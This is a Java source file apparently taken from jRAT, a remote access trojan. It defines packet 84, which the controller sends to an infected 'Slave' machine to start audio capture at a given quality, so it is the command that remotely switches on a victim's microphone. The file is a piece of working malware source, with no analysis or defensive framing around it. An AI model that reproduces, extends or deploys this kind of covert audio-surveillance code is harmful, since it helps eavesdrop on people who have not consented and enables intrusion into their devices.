package pro.jrat.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.Slave;


public class Packet84SoundCapture extends AbstractOutgoingPacket {
	
	private boolean initialize;
	private String quality;

	public Packet84SoundCapture(boolean initialize, String quality) {
		this.initialize = initialize;
		this.quality = quality;
	}
	
	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(initialize);
	
		if (initialize) {
			slave.writeLine(quality);
		}
	}

	@Override
	public byte getPacketId() {
		return 84;
	}

}
